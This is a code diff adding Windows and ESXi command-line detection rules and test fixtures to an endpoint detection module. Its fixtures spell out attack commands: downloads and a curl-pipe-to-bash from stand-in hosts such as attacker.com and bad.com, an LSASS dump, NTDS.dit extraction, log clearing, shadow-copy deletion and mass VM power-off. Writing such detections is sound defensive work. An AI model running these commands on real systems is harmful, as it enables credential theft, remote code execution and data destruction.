@@ -948,3 +948,313 @@ ENTERPRISE_DETECTION_RULES: List[DetectionRuleContent] = [
         ],
     ),
 ]
+
+
+# ── D17 · declaration batch 1 · Windows/ESXi endpoint command-line family ──
+# One coherent family, declared together: every rule below decides on the
+# process command line and/or the executing image, which is exactly what the
+# canonical `process` entity carries. Declaring them as a batch (rather than
+# one rule at a time) is what makes the contract reviewable: the same fields,
+# the same operators, one diff.
+#
+# The declarations describe the predicates FAITHFULLY, including their
+# case-insensitivity — the `*_ci` operators exist for that reason. They do
+# not decide anything: `predicate` remains the sole authority on a match, and
+# a declaration only says which canonical field and value are cited when it
+# fires.
+#
+# Rules whose PRIMARY field is not in the canonical evidence model
+# (`registry.path`, `service_name`, `TargetImage`) are NOT declared here.
+# Declaring them against `process.command_line` alone would describe a rule
+# NivX cannot actually cite, so they stay on the frozen declaration-debt
+# ledger with their gap recorded in `declaration_contract.TELEMETRY_GAPS`.
+
+_CMD = "process.command_line"
+_IMG = "process.executable_path"
+
+_D17_BATCH_1: Dict[str, List[RuleCondition]] = {
+    "DET-EX-002": [
+        RuleCondition("image.certutil", _IMG, "basename_in_ci",
+                      ["certutil.exe"], note="certutil is the executing image"),
+        RuleCondition("cmd.certutil", _CMD, "contains_ci", "certutil",
+                      note="or certutil is named on the command line"),
+        RuleCondition("cmd.urlcache", _CMD, "contains_ci", "urlcache",
+                      note="the download cache mode is requested"),
+        RuleCondition("cmd.transfer_indicator", _CMD, "contains_any_ci",
+                      ["-split", "-f", "http"],
+                      note="with a split/force flag or a URL"),
+    ],
+    "DET-EX-003": [
+        RuleCondition("image.bitsadmin", _IMG, "basename_in_ci",
+                      ["bitsadmin.exe"], note="bitsadmin is the image"),
+        RuleCondition("cmd.bitsadmin", _CMD, "contains_ci", "bitsadmin",
+                      note="or bitsadmin is named on the command line"),
+        RuleCondition("cmd.transfer", _CMD, "contains_ci", "/transfer",
+                      note="a BITS transfer job is created"),
+        RuleCondition("cmd.remote_scheme", _CMD, "contains_any_ci",
+                      ["http", "ftp"], note="from a remote URL"),
+    ],
+    "DET-EX-004": [
+        RuleCondition("image.wmic", _IMG, "basename_in_ci", ["wmic.exe"],
+                      note="wmic is the image"),
+        RuleCondition("cmd.wmic", _CMD, "contains_ci", "wmic",
+                      note="or wmic is named on the command line"),
+        RuleCondition("cmd.process_call_create", _CMD, "contains_all_ci",
+                      ["process", "call", "create"],
+                      note="the process-creation verb triple"),
+    ],
+    "DET-EX-005": [
+        RuleCondition("image.regsvr32", _IMG, "basename_in_ci",
+                      ["regsvr32.exe"], note="regsvr32 is the image"),
+        RuleCondition("cmd.regsvr32", _CMD, "contains_ci", "regsvr32",
+                      note="or regsvr32 is named on the command line"),
+        RuleCondition("cmd.scriptlet", _CMD, "contains_all_ci",
+                      ["/i:", "scrobj.dll"],
+                      note="a scriptlet is registered through scrobj"),
+        RuleCondition("cmd.remote_url", _CMD, "contains_any_ci",
+                      ["http://", "https://"],
+                      note="and the scriptlet is remote"),
+    ],
+    "DET-PS-002": [
+        RuleCondition("image.schtasks", _IMG, "basename_in_ci",
+                      ["schtasks.exe"], note="schtasks is the image"),
+        RuleCondition("cmd.schtasks", _CMD, "contains_ci", "schtasks",
+                      note="or schtasks is named on the command line"),
+        RuleCondition("cmd.create", _CMD, "contains_ci", "/create",
+                      note="a task is being created"),
+        RuleCondition("cmd.task_definition", _CMD, "contains_any_ci",
+                      ["/ru", "/sc", "/tr"],
+                      note="with a run-as, schedule or action argument"),
+    ],
+    "DET-PS-003": [
+        RuleCondition("image.sc", _IMG, "basename_in_ci", ["sc.exe"],
+                      note="sc.exe is the image"),
+        RuleCondition("cmd.sc", _CMD, "contains_ci", "sc.exe",
+                      note="or sc.exe is named on the command line"),
+        RuleCondition("cmd.create", _CMD, "contains_ci", "create",
+                      note="a service is being created"),
+        RuleCondition("cmd.binpath", _CMD, "contains_ci", "binpath=",
+                      note="with an attacker-chosen service binary"),
+    ],
+    "DET-DE-002": [
+        RuleCondition("image.wevtutil", _IMG, "basename_in_ci",
+                      ["wevtutil.exe"], note="wevtutil is the image"),
+        RuleCondition("cmd.wevtutil", _CMD, "contains_ci", "wevtutil",
+                      note="or wevtutil is named on the command line"),
+        RuleCondition("cmd.clear_log", _CMD, "contains_any_ci",
+                      [" cl ", "clear-log"],
+                      note="the clear-log verb is used"),
+    ],
+    "DET-CR-001": [
+        RuleCondition("cmd.lsass", _CMD, "contains_ci", "lsass",
+                      note="LSASS is named on the command line"),
+        RuleCondition("cmd.dump_technique", _CMD, "contains_any_ci",
+                      ["comsvcs.dll", "minidump", "procdump", "dumpps",
+                       "rundll32", "0x00040", "processdump"],
+                      note="together with a memory-dump technique"),
+    ],
+    "DET-CR-002": [
+        RuleCondition("cmd.ntds", _CMD, "contains_ci", "ntds.dit",
+                      note="the AD database file is named"),
+        RuleCondition("cmd.extraction_technique", _CMD, "contains_any_ci",
+                      ["ntdsutil", "vssadmin", "volume\\", "ac i ntds",
+                       "create full"],
+                      note="with a shadow-copy or ntdsutil extraction"),
+    ],
+    "DET-DS-001": [
+        RuleCondition("image.recon_tool", _IMG, "basename_contains_any_ci",
+                      ["sharphound", "adfind", "bloodhound"],
+                      note="a known AD reconnaissance tool is the image"),
+        RuleCondition("cmd.adfind", _CMD, "contains_ci", "adfind",
+                      note="or adfind is named on the command line"),
+        RuleCondition("cmd.ldap_query", _CMD, "contains_any_ci",
+                      ["-f ", "objectcategory=", "objectclass="],
+                      note="with an LDAP query argument"),
+    ],
+    "DET-LM-001": [
+        RuleCondition("image.psexesvc", _IMG, "basename_in_ci",
+                      ["psexesvc.exe"],
+                      note="the PsExec service binary is the image"),
+        RuleCondition("cmd.psexec", _CMD, "contains_ci", "psexec",
+                      note="or PsExec is named on the command line"),
+    ],
+    "DET-CC-001": [
+        RuleCondition("image.rmm_tool", _IMG, "basename_contains_any_ci",
+                      ["anydesk.exe", "screenconnect", "teamviewer.exe",
+                       "rustdesk.exe", "ateraagent", "splashtop"],
+                      note="a dual-use remote-access tool is the image"),
+        RuleCondition("cmd.rmm_tool", _CMD, "contains_any_ci",
+                      ["anydesk.exe", "screenconnect", "teamviewer.exe",
+                       "rustdesk.exe", "ateraagent", "splashtop"],
+                      note="or it is named on the command line"),
+    ],
+    "DET-IM-001": [
+        RuleCondition("cmd.vssadmin", _CMD, "contains_any_ci",
+                      ["vssadmin", "wmic"],
+                      note="a shadow-copy management utility is invoked"),
+        RuleCondition("cmd.delete", _CMD, "contains_ci", "delete",
+                      note="with a delete verb"),
+        RuleCondition("cmd.shadow_target", _CMD, "contains_any_ci",
+                      ["shadows", "shadowcopy"],
+                      note="targeting the shadow copies themselves"),
+    ],
+    "DET-IM-003": [
+        RuleCondition("cmd.esxi_cli", _CMD, "contains_any_ci",
+                      ["vim-cmd", "esxcli"],
+                      note="an ESXi management CLI is invoked"),
+        RuleCondition("cmd.destructive_verb", _CMD, "contains_any_ci",
+                      ["vmsvc/power.off", "vmsvc/destroy"],
+                      note="with a power-off or destroy verb"),
+        RuleCondition("cmd.mass_scope", _CMD, "contains_any_ci",
+                      ["vmsvc/getallvms", "all", "grep"],
+                      note="applied across every virtual machine"),
+    ],
+}
+
+#: D17 · canonical-shaped fixtures for the batch. The pre-existing fixtures
+#: are Sysmon-shaped (`Image`, `CommandLine`) and are KEPT — they prove the
+#: predicate still reads raw shapes. These additional fixtures are the ones
+#: that prove the DECLARATION explains a match on real canonical evidence.
+def _canon(cmd: str, image: str = "") -> Dict[str, Any]:
+    return {"event_type": "process_execution",
+            "process": {"command_line": cmd, "executable_path": image,
+                        "name": image.replace("\\", "/").rsplit("/", 1)[-1]},
+            "command_line": cmd, "image": image}
+
+
+_D17_BATCH_1_FIXTURES: Dict[str, List[DetectionFixture]] = {
+    "DET-EX-002": [
+        DetectionFixture("positive_canonical", _canon(
+            "certutil.exe -urlcache -split -f http://attacker.com/mal.exe",
+            "C:\\Windows\\System32\\certutil.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "certutil.exe -dump mycert.cer",
+            "C:\\Windows\\System32\\certutil.exe"), False)],
+    "DET-EX-003": [
+        DetectionFixture("positive_canonical", _canon(
+            "bitsadmin /transfer job http://attacker.com/mal.exe C:\\a.exe",
+            "C:\\Windows\\System32\\bitsadmin.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "bitsadmin /list", "C:\\Windows\\System32\\bitsadmin.exe"),
+            False)],
+    "DET-EX-004": [
+        DetectionFixture("positive_canonical", _canon(
+            "wmic /node:HOST process call create \"cmd /c calc\"",
+            "C:\\Windows\\System32\\wbem\\WMIC.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "wmic process list brief",
+            "C:\\Windows\\System32\\wbem\\WMIC.exe"), False)],
+    "DET-EX-005": [
+        DetectionFixture("positive_canonical", _canon(
+            "regsvr32 /s /n /u /i:http://bad.com/a.sct scrobj.dll",
+            "C:\\Windows\\System32\\regsvr32.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "regsvr32 mycomponent.dll",
+            "C:\\Windows\\System32\\regsvr32.exe"), False)],
+    "DET-PS-002": [
+        DetectionFixture("positive_canonical", _canon(
+            "schtasks /create /tn Updater /tr C:\\a.exe /sc onlogon /ru SYSTEM",
+            "C:\\Windows\\System32\\schtasks.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "schtasks /query /tn Updater",
+            "C:\\Windows\\System32\\schtasks.exe"), False)],
+    "DET-PS-003": [
+        DetectionFixture("positive_canonical", _canon(
+            "sc.exe create EvilSvc binpath= C:\\temp\\evil.exe start= auto",
+            "C:\\Windows\\System32\\sc.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "sc.exe query spooler", "C:\\Windows\\System32\\sc.exe"),
+            False)],
+    "DET-DE-002": [
+        DetectionFixture("positive_canonical", _canon(
+            "wevtutil cl Security",
+            "C:\\Windows\\System32\\wevtutil.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "wevtutil qe Security /c:10",
+            "C:\\Windows\\System32\\wevtutil.exe"), False)],
+    "DET-CR-001": [
+        DetectionFixture("positive_canonical", _canon(
+            "rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump 640 "
+            "C:\\temp\\lsass.dmp full",
+            "C:\\Windows\\System32\\rundll32.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "tasklist /fi \"imagename eq lsass.exe\"",
+            "C:\\Windows\\System32\\tasklist.exe"), False)],
+    "DET-CR-002": [
+        DetectionFixture("positive_canonical", _canon(
+            "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\ntds.dit\"",
+            "C:\\Windows\\System32\\ntdsutil.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "dir C:\\Windows\\NTDS", "C:\\Windows\\System32\\cmd.exe"),
+            False)],
+    "DET-DS-001": [
+        DetectionFixture("positive_canonical", _canon(
+            "adfind -f objectcategory=computer",
+            "C:\\temp\\AdFind.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "net view", "C:\\Windows\\System32\\net.exe"), False)],
+    "DET-LM-001": [
+        DetectionFixture("positive_canonical", _canon(
+            "psexec \\\\HOST -s cmd.exe", "C:\\temp\\PsExec.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "whoami /groups", "C:\\Windows\\System32\\whoami.exe"), False)],
+    "DET-CC-001": [
+        DetectionFixture("positive_canonical", _canon(
+            "anydesk.exe --start-service",
+            "C:\\Program Files\\AnyDesk\\AnyDesk.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "mstsc.exe /v:HOST", "C:\\Windows\\System32\\mstsc.exe"),
+            False)],
+    "DET-IM-001": [
+        DetectionFixture("positive_canonical", _canon(
+            "vssadmin delete shadows /all /quiet",
+            "C:\\Windows\\System32\\vssadmin.exe"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "vssadmin list shadows",
+            "C:\\Windows\\System32\\vssadmin.exe"), False)],
+    "DET-IM-003": [
+        DetectionFixture("positive_canonical", _canon(
+            "vim-cmd vmsvc/getallvms | awk '{print $1}' | xargs -n1 "
+            "vim-cmd vmsvc/power.off", "/bin/vim-cmd"), True),
+        DetectionFixture("negative_canonical", _canon(
+            "vim-cmd vmsvc/getallvms", "/bin/vim-cmd"), False)],
+}
+
+
+#: D17 · the contract gate exposed one PRE-EXISTING defect: DET-EX-006 was
+#: declared in D8 but its only positive fixture is Sysmon-shaped, so the
+#: declared canonical field was ABSENT and the citation explained nothing.
+#: A canonical-shaped fixture is added — the declaration was right, the
+#: proof was missing. No predicate, condition or version changes.
+_D17_FIXTURE_BACKFILL: Dict[str, List[DetectionFixture]] = {
+    "DET-EX-006": [
+        DetectionFixture("positive_canonical", _canon(
+            "curl -s http://bad.com/setup.sh | bash", "/usr/bin/bash"),
+            True),
+        DetectionFixture("negative_canonical", _canon(
+            "curl -O http://example.com/archive.tar.gz", "/usr/bin/curl"),
+            False)],
+}
+
+
+def _apply_declaration_batch() -> None:
+    """Attach batch 1 in ONE reviewable place, and bump each rule_version.
+
+    A declaration change is a rule change: D8 requires the version to move
+    so a stored citation can be tied to the declaration that produced it.
+    """
+    for rule in ENTERPRISE_DETECTION_RULES:
+        conditions = _D17_BATCH_1.get(rule.rule_id)
+        if not conditions:
+            continue
+        rule.conditions = list(conditions)
+        rule.fixtures = list(rule.fixtures) + list(
+            _D17_BATCH_1_FIXTURES.get(rule.rule_id, []))
+        rule.rule_version = "2"
+    for rule in ENTERPRISE_DETECTION_RULES:
+        extra = _D17_FIXTURE_BACKFILL.get(rule.rule_id)
+        if extra:
+            rule.fixtures = list(rule.fixtures) + list(extra)
+
+
+_apply_declaration_batch()
